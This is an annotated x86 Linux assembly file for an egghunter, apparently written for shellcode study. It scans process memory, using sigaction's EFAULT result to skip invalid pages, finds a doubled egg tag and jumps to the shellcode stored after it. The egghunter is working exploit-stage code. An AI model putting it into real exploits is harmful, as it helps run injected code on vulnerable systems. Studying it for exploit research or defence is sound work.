; Filename: egghunter.asm

; Reference

; from /usr/include/i386-linux-gnu/asm/unistd_32.h
; #define __NR_sigaction 67
; int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact);


global _start

section .text

_start:
    
page_alignment:

	or cx,0xfff		        ; increments addresses by 4095


increment_address:

	inc ecx			        ; increments addresses by 1
	jnz not_null            ; As noted by sh3llc0d3r on THE SH3LLC0D3R'S BLOG, this line of code and the next makes sure that when the egghunter reaches address 0x00000000, it is incremented to avoid a segmentation fault. 
	inc ecx


not_null:

	push byte +0x43		    ; number of the sigaction() system call
	pop eax			        ; pop 0x43 in EAX    
	int 0x80		        ; inovke sigaction() system call    

	cmp al,0xf2		        ; compares the return value of sigaction() with 0xf2, which represents the low-byte of EFAULT's return value (0xfffffff2) 
	jz page_alignment       ; if AL is equal to EFAULT (0xf2), we know that act points to memory which is not a valid part of the process address space. Thus, control goes back to page_alignment function
	mov eax, 0x50905090	    ; else, the egg tag is placed in EAX    
	mov edi, ecx		    
	scasd			        ; compares the byte in EAX with the byte at [ES:EDI], and sets the flags accordingly. It then increments or decrements (depending on the direction flag: increments if the flag is clear, decrements if it is set) EDI.    
	jnz increment_address   ; if the value in EAX (the egg tag) is not equal to the value pointed to by the address stored in EDI, control jumps to increment_address function
	scasd			        ; else, scasd is used a second time to compare the value in EAX (the egg tag) with the value at [EDI +4]
	jnz increment_address   ; if the value in EAX (the egg tag) is not equal to the value at [EDI +4], control jumps to increment_address function

	jmp edi			        ; else, the egghunter found the egg!
